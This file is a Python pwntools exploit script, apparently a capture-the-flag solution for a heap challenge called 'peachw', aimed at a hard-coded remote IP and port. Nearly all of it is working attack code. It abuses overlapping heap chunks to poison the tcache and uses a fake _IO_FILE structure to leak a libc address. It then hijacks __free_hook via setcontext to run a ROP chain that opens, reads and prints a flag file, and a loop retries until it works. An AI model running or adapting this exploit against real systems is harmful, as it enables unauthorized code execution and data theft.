# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './peachw'
os.system('chmod +x %s'%binary)
context.binary = binary
# context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.26.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '1.13.162.249'
    port = '10003'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 10)

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sa('choice:',num)

def add(idx , size ,name = 'aa',  text = 'bb'):
    cmd(p32(1))
    sla('Index ?',idx)
    sa('peach  :' , name)
    sla('your peach:' , size)
    sa('your peach :' , text)

def errorAdd(idx , size = 0x10 ,name = 'aa'):
    cmd(p32(1))
    sla('Index ?',idx)
    sa('peach  :' , name)
    sla('your peach:' , size)

def delete(idx ):
    cmd(p32(2))
    sla('Index ?',idx)

def edit(idx , size , text):
    cmd(p32(4))
    sla('Index ?',idx)
    sa('your peach : ' , size)
    sa('your peach ' , text)

def leak(idx ):
    cmd(p32(3))
    sla('Index ?',idx)
    sla('number?' , p32(0))


# one_gad = one_gadget(libc.path)

def attack():
    
    # list = $rebase(0x0000000000202180)

    sla('peach?' , 'yes\x00')
    
    ru('The peach is ')
    low_addr = rint(5)
    lg('low_addr' , low_addr)

    add(0 , 0x108)

    edit(0 , p32(0x420) ,flat(0,0)+p16(0x9010))
    delete(0)

    p.success("ok")
    add(0 , 0x248 , p64(0) , '\x07'*0x40)
    delete(0)

    add(0 , 0x108 , p16(0x8720), p16(0x8720))
    add(1 , 0x420 , p16(0x8720) )
    delete(0)

    fake_io = flat(
        0xfbad1800 , 0,
        0,0,
    )
    add(0 , 0x1b8 , p64(0) ,fake_io + '\x00' )

    leak = l64()
    if(leak == 0):
        exit(0)
    libc.address = leak - 0x3d73e0
    __free_hook = libc.sym['__free_hook']

    lg('__free_hook',__free_hook)

    # dbg()
    setcontext = libc.sym['setcontext'] + 53
    
    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_rdx_ret = libc.search(asm('pop rdx; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    ret = pop_rdi_ret + 1
    
    flag_addr = __free_hook + 0x88
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x80,'\x00') + 'flag\x00\x00\x00\x00'
    # len chain 0x80
    
    payload = p64(setcontext) + chain + p64(0)*2 + p64(__free_hook + 8) + p64(ret)

    lg('setcontext',setcontext)
    # dbg('free')
    add(2 , 0x108 ,  p64(__free_hook)*2)
    add(3 , 0x228 , p64(0) , payload)

    # dbg('free')
    delete(3)

    # p.success(getShell())
    p.interactive()

def boom( pwn ):
    context.update( os = 'linux', arch = 'amd64',timeout = 1)
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

boom(attack)
# attack()

'''
@File    :   peachw.py
@Time    :   2022/01/23 13:00:31
@Author  :   Niyah 
'''